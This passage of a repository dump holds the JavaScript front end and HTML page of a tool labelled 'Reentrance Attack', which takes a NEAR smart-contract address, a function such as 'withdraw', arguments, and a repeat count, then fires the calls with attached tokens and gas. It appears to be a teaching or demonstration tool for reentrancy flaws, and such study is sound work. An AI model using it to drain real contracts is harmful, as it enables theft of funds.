  const attached = nearAPI.utils.format.parseNearAmount($('#attached').val())
  const gas = String(Number($('#gas').val()) * 10 ** 12) 

  let args_enc = new Array()
  if(args){
    const enc = new TextEncoder();
    args_enc = Array.from(enc.encode(JSON.stringify(args)))
  }

  let params = {target:target, fc:fc, args:args_enc, N:N,
                attach:attached, GAS:gas}
 
  // Reset UI
  current_text = ""

  if(attached>0){
    // If there is money, we will be redirected to NEAR
    $('#result').html = "You will be redirected to NEAR"
    exec(params, attached)
  }else{
    // If not, wait for it to finish
    $('#result').html('Contacting contract... <span id="spin" class="fas fa-sync fa-spin"></span>')

    await exec_and_return(params, attached)
    .then(respon => {$('#spin').hide(); console.info("Finished")})
    .catch(error => {$('#spin').hide(); console.error(error)})
  }
}

const container = document.getElementById("args")
const options = {mainMenuBar:false}
const editor = new JSONEditor(container, options)

// set json
const initialJson = {
    "array": [1, 2, 3],
    "boolean": true,
    "null": null,
    "number": 123,
    "object": {"a": "b", "c": "d"},
    "amount": "500000000000000000000000"
}

editor.set(initialJson)

window.n2yn = function(){
  $('#ynear').val(nearAPI.utils.format.parseNearAmount($('#near').val()))
}

// Capture console logs, errors, warn, info
function proxy(context, method, type) { 
  return function() {
    let text = Array.prototype.slice.apply(arguments).join(" ")
    text = "<span class='"+type+"'>"+text+"</span>"
    current_text = $('#result').html() + "<br>" + text
    $('#result').html(current_text)
    method.apply(context, arguments)
  }
}

// let's do the actual proxying over originals
console.log = proxy(console, console.log, 'text-success')
console.error = proxy(console, console.error, 'text-danger')
console.warn = proxy(console, console.warn, 'text-danger')
console.info = proxy(console, console.info, 'text-info')

'''
'''--- reentrancy_attack/src/index.html ---
<!DOCTYPE html>
<body>
<head>
  <meta charset="utf-8">
  <title>Reentrance Attack</title>

  <!-- Font awesome -->
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css"/>
  <!-- Bootstrap -->
  <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css"
    integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
  <script src="https://code.jquery.com/jquery-3.3.1.slim.min.js"
    integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js"
    integrity="sha384-UO2eT0CpHqdSJQ6hJty5KVphtPhzWj9WO1clHTMGa3JDZwrnQq4sF86dIHNDz0W1" crossorigin="anonymous"></script>
  <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js"
    integrity="sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM" crossorigin="anonymous"></script>

  <!-- json editor -->
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jsoneditor/9.4.1/jsoneditor.min.js" integrity="sha512-gpE/vYKJCAfv267phg9Hb+EbxJHxN27V490vWDKe+99ow7FnZGF9Cd5zd24dsYiM4n7iE7E0+ucPCXrtnnn5Cg==" crossorigin="anonymous"></script>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/jsoneditor/9.4.1/jsoneditor.css" integrity="sha512-cC1pvPq3s1SHRrOj6iqqY7wgIY1rc71D6WUrL6Tkd1jDpVOZlfQl3ybwwBos8ktkZAK/iwQ4nWj/qUhlZ/rxrw==" crossorigin="anonymous" />

  <link rel="stylesheet" href="./assets/css/main.css"/>
</head>

<body class="bg-light">
  <div class="container">
    <div class="my-3 border rounded py-4 px-5 bg-white">
      <section id='logged-out' style="display:none">
        You are not logged in, please: 
        <button type="button" class="btn btn-primary"
                onclick="login()"> Login </button>
      </section>

      <section id='logged-in' style="display:none">
        Logged in as: <span id="account"> </span>
        <button class="btn btn-secondary" type="button"
                onclick="logout()"> Logout </button>

        <form class="mt-5">
          <div class="form-group">
            <label for="target">Target</label>
            <input type="text" class="form-control" id="target"
                   placeholder="dev-1620199843122-4433930">
            <small class="form-text text-muted">
              The address of the contract to attack
            </small>
          </div>

          <div class="form-group">
            <label for="fc">Function</label>
            <input type="text" class="form-control" id="fc"
                   placeholder="withdraw">
            <small class="form-text text-muted">
              The function to call in the contract
            </small>
          </div>

          <div class="form-group">
            <label for="args">Arguments</label>
            <div id="args"></div>
            <small class="form-text text-muted">
                The arguments of the function. Remember,
                <input type="text" class="border-0 small-input" id="near" value="0.10" onkeyup="n2yn()"> N is 
                <input type="text" class="border-0 large-input" id="ynear" value="100000000000000000000000"> yN
            </small>
          </div>

          <div class="row">
            <div class="col-4">
              <div class="form-group">
                <label for="times">Times</label>
                <input type="number" class="form-control" id="times" placeholder="1">
                <small class="form-text text-muted">
                  Number of times the function will be called
                </small>
              </div>
            </div>

            <div class="col-4">
              <div class="form-group">
                <label for="attached">Attached</label>
                <div class="input-group">
                  <input type="number" class="form-control" id="attached"
                         placeholder="0.1" step="0.01">
                  <div class="input-group-append">
                      <div class="input-group-text">NEAR</div>
                  </div>
                </div>
                <small class="form-text text-muted">
                  Amount of NEAR attached to the call
                </small>
              </div>
            </div>

            <div class="col-4">
              <div class="form-group">
                <label for="gas">Gas</label>
                <div class="input-group">
                  <input type="number" class="form-control" id="gas"
                         placeholder="9">
                  <div class="input-group-append">
                      <div class="input-group-text">TGas</div>
                  </div>
                </div>
                <small class="form-text text-muted">
                  Amount of Gas to attach on <b>every call</b>
                </small>
              </div>
            </div>
          </div>

        <button type="button" class="btn btn-primary" onclick="exec()"> Execute </button>
        </form>

        <hr class="my-4">

        <label> Result: </label>
        <div class="bg-dark p-3 text-info" id="result"> Execute to see the result </label>

    </section>
  </div>  

  <label class="text-align-right">
    Made by <a href="https://www.twitter.com/gagdiez">gagdiez</a>
  </label>

  </div>
  <script src="assets/js/index.js"></script>
</body>
</html>

'''